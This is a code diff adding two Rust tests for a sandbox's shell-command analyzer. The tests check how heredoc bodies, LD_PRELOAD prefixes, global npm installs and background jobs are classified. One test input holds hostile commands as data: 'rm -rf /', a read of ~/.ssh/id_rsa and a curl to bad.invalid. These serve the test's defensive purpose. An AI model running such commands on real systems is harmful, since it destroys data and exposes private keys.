@@ -20,6 +20,51 @@ const CONTAINER: SandboxCapabilities =
 const BARE: SandboxCapabilities = SandboxCapabilities::PASSTHROUGH;
 
 #[tokio::test]
+async fn command_facts_keep_quoted_heredoc_data_out_of_host_policy_inputs() -> tinybus::Result<()> {
+    let analysis = BoxService::default()
+        .analyze_command(
+            "cat <<'EOF' > report.txt\nrm -rf /; $HOME/.ssh/id_rsa; $(curl bad.invalid)\nEOF\n"
+                .into(),
+        )
+        .await?;
+    assert!(analysis.redirection);
+    assert!(!analysis.hidden_execution);
+    assert!(!analysis.expansion);
+    assert!(!analysis.background);
+    // Preserve the existing scanner's delimiter segment and conservative
+    // unknown-command category while excluding the document body.
+    assert_eq!(analysis.segments.len(), 2);
+    assert_eq!(analysis.segments[1].normalized_name, "eof");
+    assert_eq!(analysis.segments[1].class, tinybox_bus::CommandClass::Write);
+    assert_eq!(analysis.segments[0].normalized_name, "cat");
+    assert_eq!(analysis.segments[0].class, tinybox_bus::CommandClass::Read);
+    assert!(
+        !analysis
+            .literal_words
+            .iter()
+            .any(|word| word.contains(".ssh") || word.contains("curl"))
+    );
+    Ok(())
+}
+
+#[tokio::test]
+async fn command_facts_preserve_global_install_and_environment_execution_signals()
+-> tinybus::Result<()> {
+    let analysis = BoxService::default()
+        .analyze_command("LD_PRELOAD=./hook.so git status && npm install -g tool &".into())
+        .await?;
+    assert!(analysis.background);
+    assert!(analysis.segments[0].leading_env_assignment);
+    assert!(analysis.segments[0].dangerous_env_prefix);
+    assert_eq!(analysis.segments[0].basename, "git");
+    assert_eq!(
+        analysis.segments[1].class,
+        tinybox_bus::CommandClass::Install
+    );
+    Ok(())
+}
+
+#[tokio::test]
 async fn jail_status_reports_the_detected_backend_without_starting_a_process() -> tinybus::Result<()>
 {
     let status = BoxService::default().jail_status().await?;
